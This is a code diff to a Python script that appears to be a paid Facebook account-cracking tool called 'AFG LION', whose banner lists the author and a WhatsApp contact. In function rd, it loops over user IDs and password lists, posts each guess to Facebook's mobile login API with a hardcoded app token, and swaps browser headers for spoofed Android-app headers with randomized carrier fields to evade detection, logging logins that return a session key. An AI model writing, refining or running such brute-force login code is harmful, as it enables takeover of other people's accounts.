@@ -115,17 +115,16 @@ def clear():
 	os.system('clear')
 	print(logo)
 logo = """\033[1;92m                                                                                                                                                     
-  ╔═╗╔═╗╔═╗  ╦  ╦╔═╗╔╗╔
+╔═╗╔═╗╔═╗  ╦  ╦╔═╗╔╗╔
 ╠═╣╠╣ ║ ╦  ║  ║║ ║║║║
 ╩ ╩╚  ╚═╝  ╩═╝╩╚═╝╝╚╝
-                                             
 
  \033[1;95m
  \033[1;97m----------------------------------------
- \033[1;97m[ \033[1;92m\033[1;92m Author   \033[1;97m \033[1;92m \033[1;97m] \033[1;92m AFG LION KING
+ \033[1;97m[ \033[1;92m\033[1;92m Author   \033[1;97m \033[1;92m \033[1;97m] \033[1;92m AFG LION
  \033[1;97m[ \033[1;92m\033[1;92m WhatsApp\033[1;97m \033[1;92m \033[1;97m] \033[1;92m +93783361438
  \033[1;97m[ \033[1;92m\033[1;92m Status   \033[1;97m \033[1;92m \033[1;97m] \033[97;1m PAID
- \033[1;97m[ \033[1;92m\033[1;92m Version\033[1;97m \033[1;92m \033[1;97m] \033[1;92m 0.3
+ \033[1;97m[ \033[1;92m\033[1;92m Version\033[1;97m \033[1;92m \033[1;97m] \033[1;92m 0.5
  \033[1;97m----------------------------------------"""
 
 def line():
@@ -492,28 +491,8 @@ def rd(ids,passlist):
 		sys.stdout.write('\r\r\033[1;32m\x1b[1;92m [ AFGLION \x1b[1;92m] %s|\033[1;32mOK|%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()		
 		for pas in passlist:                                          
 			accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-			ua = 'Davik/2.1.0 (linux; U; Android 7.0.1; Vivo Y35 Build/RKQ1.21110.002[FBAN/FB4A;FBAV/359.0.0.30.118;FBBV/188497645;FBDM/{density=2.5,width=1080,height=720};FBLC/en_US;FBRV/188497645;FBCR/Telekom China;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/Vivo Y35;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'			
-			headers = {
-             "Host": "www.messenger.com",
-             "Connection": "keep-alive",
-             "Content-Length": "267",
-             "Cache-Control": "max-age=0",
-             "sec-ch-ua": '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
-             "sec-ch-ua-mobile": "?0",
-             "sec-ch-ua-platform": '"Linux"',
-             "Upgrade-Insecure-Requests": "1",
-             "Origin": "https://www.messenger.com",
-             "Content-Type": "application/x-www-form-urlencoded",
-             "User-Agent": ua,
-             "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-             "Sec-Fetch-Site": "same-origin",
-             "Sec-Fetch-Mode": "navigate",
-             "Sec-Fetch-User": "?1",
-             "Sec-Fetch-Dest": "document",
-             "Referer": "https://www.messenger.com/",
-             "Accept-Encoding": "gzip, deflate, br",
-             "Accept-Language": "en-GB,en;q=0.9,en-US;q=0.8,en;q=0.7,ru;q=0.6,jv;q=0.5",
-			}
+			ua = 'Davik/2.1.0 (linux; U; Android 4.0.1; Vivo Y35 Build/SP1A.210812.016[FBAN/FB4A;FBAV/359.0.0.30.118;FBBV/229019490;FBDM/{density=1.0,width=720,height=1280};FBLC/en_US;FBRV/229019490;FBCR/null;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/Vivo Y35;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'			
+			headers=  {'User-Agent': ua, 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
 			data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale':'en_GB','client_country_code':'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
 			po = requests.post('https://b-graph.facebook.com/auth/login',data=data,headers=head).json()
 			if 'session_key' in po:
